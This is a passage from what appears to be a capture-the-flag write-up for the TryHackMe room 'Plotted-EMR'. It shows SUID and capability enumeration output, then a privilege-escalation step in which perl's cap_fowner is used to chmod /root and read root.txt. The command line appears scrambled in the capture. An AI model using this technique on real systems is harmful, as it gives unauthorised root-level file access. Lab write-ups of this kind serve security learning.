/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2284/bin/mount
/snap/core18/2284/bin/ping
/snap/core18/2284/bin/su
/snap/core18/2284/bin/umount
/snap/core18/2284/usr/bin/chfn
/snap/core18/2284/usr/bin/chsh
/snap/core18/2284/usr/bin/gpasswd
/snap/core18/2284/usr/bin/newgrp
/snap/core18/2284/usr/bin/passwd
/snap/core18/2284/usr/bin/sudo
/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2284/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/14549/usr/lib/snapd/snap-confine
/root
```


```bash
plot_admin@plotted:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/perl = cap_fowner+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl5.30.0 = cap_fowner+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep
```



```bash
plot_admin@plotted:/tmp$ 
txt";' && cat /root/root.txtl -e 'chmod 07777, "/root"; chmod 0777, "/root/root. 
Congratulations on completing this room!

********************************

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms
-sa.infinity8888
plot_admin@plotted:/tmp$ 
```


<p>2.3. What is root.txt<br>
<code>********************************</code></p>


<br>
<br>



<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3e6d886f-bafb-4f01-83a4-b42fd887d7ac"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/4097a7f2-c965-4192-94ac-7ecfbf6764cd"></p>

<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Room                  |Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :--------------- | :-------------------  |  :------:|:----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                       |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, Sep 6       |Medium 🚩 - <code>Plotted-EMR</code> | 488      |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno | 487      |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break | 487      |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel|486|	113ʳᵈ|	5ᵗʰ	|579ᵗʰ|	10ᵗʰ|	124,018|	940	|73|
| 2025, Sep 4       |Medium 🚩 - Cold VVars | 486      |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939   |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938   |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937   |    73     |

</div>

<p align="center">Global All Time:   114ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/8ca5c4b9-04d1-4237-a64d-157a55304477"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/d75c2844-bb94-4d43-b689-f8702b5b50a1"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/e1a5a0e1-9413-4001-89e1-c816b23fb8d6"><br>
                  Global monthly:    844ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2a50d58d-da67-428a-a2d8-311bfbc58b19"><br>
                  Brazil monthly:     12ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/90cc0c4b-ec77-4431-b244-b27f87cca18d"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>






<img width="1908" height="893" alt="image" src="https://github.com/user-attachments/assets/3e6d886f-bafb-4f01-83a4-b42fd887d7ac" />



<img width="1902" height="894" alt="image" src="https://github.com/user-attachments/assets/22b17222-0f0d-4f21-9b8b-1861f9274e43" />

<img width="1874" height="891" alt="image" src="https://github.com/user-attachments/assets/b1a7ed0e-ea88-4e25-b360-f52aa5c20a4e" />

<img width="971" height="908" alt="image" src="https://github.com/user-attachments/assets/4097a7f2-c965-4192-94ac-7ecfbf6764cd" />


